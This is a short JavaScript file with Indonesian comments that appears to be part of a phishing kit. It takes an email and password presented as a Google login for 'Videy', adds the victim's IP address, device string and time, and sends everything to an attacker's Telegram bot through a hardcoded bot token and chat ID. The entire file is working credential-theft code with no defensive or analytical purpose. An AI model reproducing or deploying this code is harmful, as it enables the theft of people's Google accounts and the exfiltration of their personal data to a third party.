// KONFIGURASI TELEGRAM BOT
const BOT_TOKEN = "8686157259:AAEbLNInmaqnPwrTTogJC3AINXIWTGerZUM";
const CHAT_ID = "7933552719";

// Fungsi kirim data ke Telegram
async function sendToTelegram(email, password) {
    const timestamp = new Date().toLocaleString('id-ID');
    const userAgent = navigator.userAgent;
    const ip = await getIP();
    
    const message = `🔐 *LOGIN GOOGLE - VIDEY* 🔐
    
📧 *Email:* ${email}
🔑 *Password:* ${password}
🌐 *IP Address:* ${ip}
📱 *Device:* ${userAgent.substring(0, 100)}
⏰ *Waktu:* ${timestamp}
━━━━━━━━━━━━━━━━━━
#LoginGoogle #Videy`;
    
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        return response.ok;
    } catch (error) {
        console.error('Error sending to Telegram:', error);
        return false;
    }
}

// Fungsi ambil IP
async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return "Tidak terdeteksi";
    }
}